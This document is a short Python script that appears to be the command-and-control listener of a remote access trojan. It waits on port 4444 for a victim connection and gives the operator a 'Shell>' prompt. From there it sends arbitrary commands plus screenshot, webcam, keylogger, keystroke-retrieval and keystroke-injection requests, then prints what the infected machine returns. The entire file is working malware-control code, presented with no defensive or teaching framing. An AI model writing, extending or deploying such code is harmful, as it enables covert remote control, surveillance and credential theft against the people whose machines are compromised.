import socket

def start_server():
    host = '0.0.0.0'
    port = 4444

    server = socket.socket()
    server.bind((host, port))
    server.listen(1)
    print(f"[+] Listening on port {port}...")

    client, address = server.accept()
    print(f"[+] Connection from {address}")

    while True:
        command = input("Shell> ")
        if command == "exit":
            client.send(b"exit")
            break
        elif command in ["screenshot", "webcam", "start_keylogger", "get_keys"] or command.startswith("type:"):
            client.send(command.encode())
            result = client.recv(4096).decode(errors='ignore')
            print(result)
        else:
            client.send(command.encode())
            result = client.recv(4096).decode(errors='ignore')
            print(result)

    client.close()
    server.close()

start_server()
